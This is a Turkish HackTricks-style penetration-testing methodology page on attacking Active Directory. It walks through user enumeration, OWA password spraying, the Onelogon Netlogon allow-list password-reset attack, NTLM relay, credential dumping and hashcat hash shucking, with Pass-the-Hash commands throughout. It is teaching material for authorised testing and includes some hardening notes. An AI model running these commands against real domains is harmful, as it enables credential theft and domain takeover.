# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içindeki **etki alanlarını**, **kullanıcıları** ve **nesneleri** verimli bir şekilde oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcının yönetilebilir **gruplar** ve **alt gruplar** hâlinde düzenlenmesini ve farklı düzeylerde **erişim haklarının** denetlenmesini sağlar.

**Active Directory** yapısı üç ana katmandan oluşur: **etki alanları**, **ağaçlar** ve **ormanlar**. Bir **etki alanı**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi nesnelerden oluşur. **Ağaçlar**, ortak bir yapıyla birbirine bağlanan etki alanı gruplarıdır. Bir **orman** ise **güven ilişkileri** aracılığıyla birbirine bağlanan birden fazla ağacın oluşturduğu koleksiyondur ve kuruluş yapısının en üst katmanını temsil eder. Bu katmanların her birinde belirli **erişim** ve **iletişim hakları** tanımlanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Dizin** – Active Directory nesneleriyle ilgili tüm bilgileri barındırır.
2. **Nesne** – Dizindeki **kullanıcılar**, **gruplar** veya **paylaşılan klasörler** gibi varlıkları ifade eder.
3. **Etki alanı** – Dizin nesneleri için bir kapsayıcı görevi görür. Bir **orman** içinde birden fazla etki alanı bulunabilir ve her biri kendi nesne koleksiyonunu tutar.
4. **Ağaç** – Ortak bir kök etki alanını paylaşan etki alanlarının grubudur.
5. **Orman** – Active Directory'deki en üst kuruluş yapısıdır; aralarında **güven ilişkileri** bulunan birkaç ağaçtan oluşur.

**Active Directory Domain Services (AD DS)**, bir ağ içindeki merkezi yönetim ve iletişim için kritik öneme sahip çeşitli hizmetleri kapsar. Bu hizmetler şunlardır:

1. **Etki Alanı Hizmetleri** – Veri depolamayı merkezileştirir ve **kimlik doğrulama** ile **arama** işlevleri dâhil olmak üzere **kullanıcılar** ve **etki alanları** arasındaki etkileşimleri yönetir.
2. **Sertifika Hizmetleri** – Güvenli **dijital sertifikaların** oluşturulmasını, dağıtılmasını ve yönetilmesini denetler.
3. **Lightweight Directory Services** – **LDAP protokolü** aracılığıyla dizin özellikli uygulamaları destekler.
4. **Directory Federation Services** – Kullanıcıların tek bir oturumda birden fazla web uygulamasında kimlik doğrulaması yapmasını sağlayan **single-sign-on** özellikleri sunar.
5. **Rights Management** – Telif hakkıyla korunan materyallerin izinsiz dağıtımını ve kullanımını düzenleyerek bu materyallerin korunmasına yardımcı olur.
6. **DNS Service** – **Etki alanı adlarının** çözümlenmesi için kritik öneme sahiptir.

Daha ayrıntılı açıklama için şuraya bakın: [**TechTerms - Active Directory Tanımı**](https://techterms.com/definition/active_directory)

### **Kerberos Kimlik Doğrulaması**

**AD'ye saldırmayı** öğrenmek için **Kerberos kimlik doğrulama sürecini** çok iyi **anlamanız** gerekir.\
[**Nasıl çalıştığını hâlâ bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Hile Sayfası

Bir AD'yi numaralandırmak/istismar etmek için çalıştırabileceğiniz komutları hızlıca görmek üzere [https://wadcoms.github.io/](https://wadcoms.github.io) adresine bakabilirsiniz.

> [!WARNING]
> Kerberos iletişimi, istemcinin doğru SPN için bilet alabilmesi amacıyla normalde **tam etki alanı adı (FQDN)** gerektirir. Bir makineye IP adresiyle erişildiğinde genellikle Kerberos yerine NTLM kullanılır.

## Active Directory keşfi (Kimlik bilgisi/oturum yok)

Bir AD ortamına erişiminiz varsa ancak herhangi bir kimlik bilginiz/oturumunuz yoksa şunları yapabilirsiniz:

- **Ağı pentest edin:**
  - Ağı tarayın, makineleri ve açık portları bulun; ardından **güvenlik açıklarını istismar etmeye** veya bu makinelerden **kimlik bilgilerini çıkarmaya** çalışın (örneğin, [yazıcılar çok ilgi çekici hedefler olabilir](ad-information-in-printers.md)).
  - DNS'i numaralandırmak; etki alanındaki web, yazıcı, paylaşım, vpn, medya vb. önemli sunucular hakkında bilgi verebilir.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Bunun nasıl yapılacağı hakkında daha fazla bilgi için Genel [**Pentest Metodolojisi**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına bakın.
- **smb hizmetlerinde null ve Guest erişimini kontrol edin** (bu yöntem modern Windows sürümlerinde çalışmaz):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Bir SMB sunucusunun nasıl numaralandırılacağına ilişkin daha ayrıntılı bir kılavuzu burada bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP'i numaralandırın**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP'in nasıl numaralandırılacağına ilişkin daha ayrıntılı bir kılavuzu burada bulabilirsiniz ( **anonim erişime** özellikle dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı poison edin**
  - [**Responder ile hizmetleri taklit ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) kimlik bilgileri toplayın
  - [**Relay attack'i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) bir host'a erişin
  - [**evil-S ile sahte UPnP hizmetlerini açığa çıkararak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) kimlik bilgileri toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Etki alanı ortamlarındaki ve herkese açık kaynaklardaki dahili belgelerden, sosyal medyadan ve hizmetlerden (özellikle web) kullanıcı adlarını/adları çıkarın.
  - Şirket çalışanlarının tam adlarını bulursanız farklı AD **kullanıcı adı biçimlerini** deneyebilirsiniz (**[burayı okuyun](https://activedirectorypro.com/active-directory-user-naming-convention/)**). En yaygın biçimler şunlardır: _AdSoyad_, _Ad.Soyad_, _AdSoy_ (her birinden 3 harf), _Ad.Soy_, _ASoyad_, _A.Soyad_, _SoyadAd_, _Soyad.Ad_, _SoyadA_, _Soyad.A_, 3 _rastgele harf ve 3 rastgele rakam_ (abc123).
  - Araçlar:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Kullanıcı numaralandırma

- **Anonim SMB/LDAP numaralandırması:** [**SMB pentest**](../../network-services-pentesting/pentesting-smb/index.html) ve [**LDAP pentest**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute numaralandırması**: **Geçersiz bir kullanıcı adı istendiğinde**, sunucu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos hata kodunu** kullanarak yanıt verir. Bu, kullanıcı adının geçersiz olduğunu belirlememizi sağlar. **Geçerli kullanıcı adlarında** ise sunucu ya bir **AS-REP yanıtında TGT** döndürür ya da kullanıcının ön kimlik doğrulaması yapması gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını verir.
- **MS-NRPC'ye kimlik doğrulaması olmadan erişim**: Etki alanı denetleyicilerindeki MS-NRPC (Netlogon) arayüzüne auth-level = 1 (Kimlik doğrulaması yok) ile erişilir. Bu yöntem, herhangi bir kimlik bilgisi olmadan kullanıcının veya bilgisayarın var olup olmadığını denetlemek için MS-NRPC arayüzüne bağlandıktan sonra `DsrGetDcNameEx2` işlevini çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) aracı bu tür numaralandırmayı uygular. Araştırmayı [burada](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> bulabilirsiniz.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bu diğer repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) kullanıcı adı listeleri bulabilirsiniz.
>
> Ancak, bundan önce gerçekleştirmiş olmanız gereken recon adımında **şirkette çalışan kişilerin adlarını** edinmiş olmanız gerekir. Ad ve soyad bilgileriyle, olası geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon**, DC üzerinde yamalanmış olsa bile, açıkça izin listesine alınmış hesaplar **eski/güvenlik açığı bulunan Netlogon güvenli kanal davranışına** hâlâ maruz kalabilir. Riskli yapılandırma, GPO'daki **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ayarı veya buna karşılık gelen **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** kayıt defteri değeridir.

Bu değer bir **SDDL security descriptor**'dır ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL'de ilgili ACE izni verilmiş tüm hesaplar veya gruplar hedef alınabilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` etkili olarak **Everyone**'ı izin listesine alır.

Operatörler için uygulamalı iş akışı:

1. **SYSVOL/GPO** ve **canlı DC kayıt defterini** kontrol ederek izin listesine alınmış principal'ları **belirleyin**.
2. SDDL'de bulunan SID'leri gerçek AD kullanıcılarına/bilgisayarlarına **çözümleyin** ve **DC machine account**'larına, **trust account**'larına ve diğer ayrıcalıklı makinelere öncelik verin.
3. İzin listesine alınmış hesap olarak **MS-NRPC / Netlogon authentication** girişimlerini tekrarlayın.
4. Başarılı bir tahminden sonra, hedef hesabın parolasını sıfırlamak için **Netlogon password-setting** özelliğini kötüye kullanın (kamuya açık PoC parolayı boş bir string olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Kamuya açık artifact'tan hızlı triage / lab örnekleri:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- **Tarayıcı**, etkin allow-list’in **SYSVOL**’da, **registry**’de veya her ikisinde de bulunabilmesi nedeniyle kullanışlıdır.
- Exploit path’in kendisi önemlidir; çünkü güvenlik açığı bulunan bir hesap belirlendikten sonra **Domain Admin ayrıcalıkları gerektirmez**.
- `DC$` gibi bir **Domain Controller machine account**’unun ele geçirilmesi özellikle tehlikelidir; bu parolanın sıfırlanması, daha geniş kapsamlı **AD takeover** yollarını doğrudan mümkün kılabilir.
- **Brute-force uygulanabilirliği** moda bağlıdır: kamuya açık artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcutsa **24-bit** brute force’u ve daha yavaş **32-bit** varyantları tanımlar.

Detection / hardening notları:

- Allow-list politikasını denetleyin ve geçici, açıkça gerekli uyumluluk istisnaları dışındaki her şeyi kaldırın.
- Güvenlik açığı bulunan Netlogon bağlantılarının engellendiğini, tespit edildiğini veya politika tarafından açıkça izin verildiğini yakalamak için DC **System** olayları **5827/5828/5829/5830/5831**’i izleyin.
- Eski bağımlılık ortadan kaldırılana kadar `VulnerableChannelAllowList` içindeki hesapları **yüksek riskli** kabul edin.

### Bir veya birkaç kullanıcı adını bilmek

Tamam, geçerli bir kullanıcı adınız olduğunu ama parolanız olmadığını biliyorsunuz... O zaman şunları deneyin:

- [**ASREPRoast**](asreproast.md): Bir kullanıcının _DONT_REQ_PREAUTH_ niteliği **yoksa**, bu kullanıcı için parolasından türetilen bir anahtarla şifrelenmiş bazı veriler içeren bir **AS_REP mesajı talep edebilirsiniz**.
- [**Password Spraying**](password-spraying.md): Bulunan kullanıcıların her biriyle en **yaygın parolaları** deneyin; belki bir kullanıcı zayıf bir parola kullanıyordur (parola politikasını göz önünde bulundurun!).
  - Kullanıcıların posta sunucularına erişmeyi denemek için **OWA sunucularına da spraying** uygulayabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**Ağdaki** bazı protokollere **poisoning** uygulayarak kırmak üzere challenge **hash**’leri **elde edebilirsiniz**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration; kullanıcı adları, e-posta tanımlayıcıları ve adlandırma kalıpları, hedef olabilecek makineler ve kimlik doğrulamaya zorlanabilecek hizmetler sağlar. Bu bağlamı kullanarak uygulanabilir NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ve AD ortamına yönelik olası yolları belirleyin.

### NetExec workspace tabanlı recon ve relay durumu kontrolleri

- Engagement başına AD recon durumunu ayrı tutmak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protokol başına SQLite DB’leri (smb/mssql/winrm/ldap/etc) oluşturur. `proto smb|mssql|winrm` ile görünümler arasında geçiş yapın ve toplanan sırları `creds` ile listeleyin. İşiniz bittiğinde hassas verileri elle silin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile hızlı subnet keşfi; **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini gösterir. `(signing:False)` görünen makineler **relay saldırılarına açıktır**; DC’ler ise genellikle signing gerektirir.
- Hedeflemeyi kolaylaştırmak için NetExec çıktısından doğrudan **/etc/hosts** içine **hostname**’ler oluşturun:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Signing nedeniyle **SMB relay to the DC engellendiğinde**, yine de **LDAP** duruşunu kontrol edin: `netexec ldap <dc>`, `(signing:None)` / zayıf channel binding bilgisini gösterir. SMB signing gerektiren ancak LDAP signing devre dışı olan bir DC, **SPN-less RBCD** gibi kötüye kullanım yöntemleri için hâlâ uygun bir **relay-to-LDAP** hedefidir.

### İstemci tarafındaki yazıcı kimlik bilgisi sızıntıları → toplu etki alanı kimlik bilgisi doğrulaması

- Yazıcı/web arayüzleri bazen **maskelenmiş yönetici parolalarını HTML içine gömer**. Kaynağı/devtools'u görüntülemek parolayı açık metin olarak gösterebilir (ör. `<input value="<password>">`) ve Basic-auth ile tarama/yazdırma depolarına erişim sağlayabilir.
- Alınan yazdırma işleri, kullanıcı başına parolalar içeren **açık metin onboarding belgeleri** barındırabilir. Test ederken eşleşmeleri koruyun:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM Creds Çalma

**null veya guest user** ile **diğer bilgisayarlara veya paylaşımlara erişebiliyorsanız**, erişildiğinde size karşı bir **NTLM kimlik doğrulamasını tetikleyecek** dosyalar (SCF file gibi) **yerleştirebilirsiniz**. Böylece **NTLM challenge’ı çalabilir** ve kırmayı deneyebilirsiniz:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, elinizdeki her NT hash’i, anahtar materyali doğrudan NT hash’inden türetilen ve daha yavaş olan diğer formatlar için aday parola olarak kullanır. Kerberos RC4 tickets, NetNTLM challenges veya cached credentials üzerinde uzun passphrase’leri brute-force etmek yerine NT hash’lerini Hashcat’in NT-candidate modes’una verirsiniz; Hashcat de plaintext’i öğrenmenize gerek kalmadan parola tekrarını doğrular. Bu yöntem, binlerce güncel ve geçmiş NT hash’i toplayabildiğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Şu durumlarda shucking kullanın:

- DCSync, SAM/SECURITY dumps veya credential vaults üzerinden bir NT corpus elde ettiyseniz ve başka domain/forest’larda tekrar kullanımını test etmeniz gerekiyorsa.
- RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses veya DCC/DCC2 blobs yakaladıysanız.
- Uzun ve kırılamayan passphrase’lerin tekrar kullanımını hızla kanıtlamak ve hemen Pass-the-Hash ile ilerlemek istiyorsanız.

Bu teknik, anahtarları NT hash’i olmayan encryption types’a karşı **çalışmaz** (ör. Kerberos etype 17/18 AES). Bir domain yalnızca AES kullanımını zorluyorsa, normal password modes’a geri dönmeniz gerekir.

#### NT hash corpus oluşturma

- **DCSync/NTDS** – En geniş NT hash kümesini (ve önceki değerlerini) almak için history ile `secretsdump.py` kullanın:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Geçmiş girdileri, Microsoft her hesap için önceki 24 hash'e kadar saklayabildiğinden aday havuzunu önemli ölçüde genişletir. NTDS sırlarını toplamanın diğer yolları için bkz.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dökümleri** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) yerel SAM/SECURITY verilerini ve önbelleğe alınmış domain logon'larını (DCC/DCC2) çıkarır. Yinelenenleri kaldırın ve bu hash'leri aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı izleyin** – Her hash'i üreten kullanıcı adı/domain bilgisini (wordlist yalnızca hex içerse bile) saklayın. Hashcat kazanan adayı gösterdiğinde eşleşen hash'ler, hangi principal'ın parolayı yeniden kullandığını hemen anlamanızı sağlar.
- Aynı forest'tan veya güvenilen bir forest'tan adayları tercih edin; bu, shucking sırasında örtüşme olasılığını en üst düzeye çıkarır.

#### Hashcat NT-candidate modları

| Hash Türü                               | Parola Modu | NT-Candidate Modu |
| --------------------------------------- | ----------- | ----------------- |
| Domain Cached Credentials (DCC)         | 1100        | 31500             |
| Domain Cached Credentials 2 (DCC2)      | 2100        | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500        | 27000             |
| NetNTLMv2                               | 5600        | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500        | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100       | 35300             |
| Kerberos 5 etype 23 AS-REP              | 18200       | 35400             |

Notlar:

- NT-candidate girdileri **ham 32 karakterlik hex NT hash'leri olarak kalmalıdır**. Kural motorlarını devre dışı bırakın (`-r` kullanmayın, hybrid modları kullanmayın); çünkü mangling, aday anahtar materyalini bozar.
- Bu modlar doğası gereği daha hızlı değildir; ancak NTLM keyspace'i (M3 Max'te yaklaşık 30.000 MH/s), Kerberos RC4'ten (yaklaşık 300 MH/s) ~100 kat daha hızlıdır. Seçilmiş bir NT listesini test etmek, yavaş formatta tüm parola alanını taramaktan çok daha ucuzdur.
- **En güncel Hashcat build'ini** daima kullanın (`git clone https://github.com/hashcat/hashcat && make install`); çünkü 31500/31600/35300/35400 modları yakın zamanda eklendi.<sup>[[7]](#references)</sup>
- AS-REQ Pre-Auth için şu anda NT modu yoktur; AES etype'ları (19600/19700) ise ham NT hash'leri yerine açık parola gerektirir, çünkü anahtarları ham NT hash'lerinden değil, UTF-16LE parolalardan PBKDF2 aracılığıyla türetilir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük yetkili bir kullanıcıyla hedef SPN için RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT listenizi kullanarak ticket'ı çıkarın:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat her NT adayından RC4 anahtarını türetir ve `$krb5tgs$23$...` blob'unu doğrular. Eşleşme, hizmet hesabının mevcut NT hash'lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot yapın:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Gerekirse daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile düz metni kurtarabilirsiniz.

#### Örnek – Önbelleğe alınmış kimlik bilgileri (mode 31600)

1. Ele geçirilmiş bir iş istasyonundan önbelleğe alınmış oturum açma bilgilerini Dump edin:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. İlginç etki alanı kullanıcısına ait DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayın ve shuck edin:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Başarılı eşleşme, listenizde zaten bulunan NT hash değerini verir ve önbelleğe alınan kullanıcının aynı parolayı yeniden kullandığını kanıtlar. Bu değeri doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) ya da parolayı elde etmek için fast NTLM mode'da brute-force uygulayın.

Aynı iş akışı NetNTLM challenge-response değerleri (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlediğinizde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash değerini maskeler/rules ile çevrimdışı olarak yeniden crack edebilirsiniz.



## Kimlik bilgileri/oturumla Active Directory enumerasyonu

Bu aşamada geçerli bir domain hesabının **kimlik bilgilerini veya oturumunu ele geçirmiş olmanız gerekir.** Geçerli kimlik bilgileriniz veya bir domain kullanıcısı olarak shell erişiminiz varsa, **daha önce verilen seçeneklerin diğer kullanıcıları ele geçirmek için hâlâ kullanılabileceğini unutmayın.**

Kimlik doğrulamalı enumerasyona başlamadan önce **Kerberos double-hop problemini** anlayın.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasyon

Bir hesabı ele geçirmek, **domain'i değerlendirme yolunda önemli bir adımdır**, çünkü kimlik doğrulamalı **Active Directory enumerasyonu** yapmanızı sağlar:

[**ASREPRoast**](asreproast.md) konusunda artık savunmasız olabilecek tüm kullanıcıları bulabilir; [**Password Spraying**](password-spraying.md) konusunda ise **tüm kullanıcı adlarının listesini** elde edip ele geçirilen hesabın parolasını, boş parolaları ve umut vadeden yeni parolaları deneyebilirsiniz.

- Temel bir recon yapmak için [**CMD**](../basic-cmd-for-pentesters.md#domain-info) kullanabilirsiniz
- Daha gizli çalışacak [**powershell** ile recon](../basic-powershell-for-pentesters/index.html) da yapabilirsiniz
- Daha ayrıntılı bilgi elde etmek için [**powerview**](../basic-powershell-for-pentesters/powerview.md) de kullanabilirsiniz
- Active Directory'de recon yapmak için bir başka harika araç da [**BloodHound**](bloodhound.md)'dur. **Çok gizli çalışmaz** (kullandığınız collection yöntemlerine bağlı olarak), ancak bunu **önemsemiyorsanız** kesinlikle denemelisiniz. Kullanıcıların nerelere RDP yapabildiğini, diğer gruplara giden yolları vb. bulun.
  - **Diğer otomatik AD enumerasyon araçları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlginç bilgiler içerebilecek [**AD'nin DNS kayıtlarına**](ad-dns-records.md) bakın.
- Directory'yi enumerate etmek için kullanabileceğiniz **GUI'li** bir araç, **SysInternal** Suite içindeki **AdExplorer.exe**'dir.
- Kimlik bilgilerini _userPassword_ ve _unixUserPassword_ alanlarında, hatta kullanıcıların _description_ ve _info_ notlarında aramak için LDAP veritabanında **ldapsearch** ile arama yapabilirsiniz. _info_ alanındaki etiketsiz, parola biçimindeki bir token yalnızca bir adaydır: amacını ve geçerliliğini ayrıca doğrulayın ve rutin enumerasyon çıktısına not içeriğini eklemeyin. Diğer yöntemler için [PayloadsAllTheThings'teki AD User comment içindeki parola](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) sayfasına bakın.
- Yetkiniz varsa, `\\<dc>\NETLOGON` veya `\\<dc>\SYSVOL\<domain>\scripts` altındaki **erişilebilir** domain logon ve sürücü eşleme script'lerini inceleyin. [Microsoft belgeleri](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller), NETLOGON share'inin script dizini rolünü açıklar. Önce adları listeleyin; ardından boyut sınırı içinde yalnızca ilgili ve okunabilir script'leri inceleyin. Tüm share'i dökmeyin veya rutin enumerasyon sırasında kimlik bilgisi değerlerini ekrana yazdırmayın. [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) PowerShell çağrısı, script'te tutulan düz metin parolayı **korumaz**. Tek başına bu çağrı, bir secret'ın hardcode edildiğini kanıtlamaz: gerçek girdisini izleyin, ardından hesabı, kimlik bilgilerinin geçerliliğini ve ayrıcalıkları ayrıca doğrulayın. Domain script'lerinin incelenmesi, uzak share incelemesidir; yerel host enumerasyonundan ayrı tutulmalıdır.
- **Linux** kullanıyorsanız, domain'i [**pywerview**](https://github.com/the-useless-one/pywerview) ile de enumerate edebilirsiniz.
- Şu otomatik araçları da deneyebilirsiniz:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarma**

  Windows'tan tüm domain kullanıcı adlarını elde etmek çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumerasyon bölümü kısa görünse de, tüm bölümlerin en önemlisidir. Bağlantılara (özellikle cmd, powershell, powerview ve BloodHound bağlantılarına) göz atın, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir değerlendirme sırasında bu, DA'ya giden yolu bulmanızı ya da hiçbir şey yapılamayacağına karar vermenizi sağlayacak kritik andır.

### Tahmin edilebilir, önceden oluşturulmuş computer account'lar -> gMSA parola erişimi

Eski join işlemleri için önceden hazırlanan computer account'lar, tahmin edilebilir bir ilk parola kullanmaya devam edebilir. NetExec'in `pre2k` modülü, `userAccountControl` değerinin `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) olması gibi ayırt edici özelliği saptar ve sondaki `$` olmadan, computer adının küçük harfli hâlinin ilk 14 karakteriyle Kerberos TGT almaya çalışır. Bu UAC değerini bir aday seçme ölçütü olarak değerlendirin; yalnızca **Pre-Windows 2000 Compatible Access** grubuna üyeliğin parolanın zayıf olduğunu kanıtladığını varsaymayın.<sup>[[18]](#references)[[20]](#references)</sup>

Adayları test etmek ve başarılı TGT'leri kaydetmek için kimlik doğrulamalı LDAP enumerasyonu kullanın. `ALL=True`, test kapsamını varsayılan `4128` filtresiyle eşleşen nesnelerin dışına genişletir.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

